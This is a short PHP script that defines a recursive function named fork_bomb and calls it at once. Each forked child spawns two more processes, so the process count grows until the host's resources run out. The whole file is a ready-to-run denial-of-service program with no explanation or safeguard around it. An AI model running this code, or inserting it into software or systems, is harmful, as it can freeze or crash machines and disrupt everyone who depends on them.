<?php

function fork_bomb()
{
    $pid = pcntl_fork(); 
    switch($pid) {
        case -1:
            //print "Could not fork!\n";
            exit;
        case 0:
            //print "In child!\n";
            fork_bomb();
	    fork_bomb();
            break;
        default:
            //print "In parent!\n";
    }
    sleep(1);
}
fork_bomb();

?>
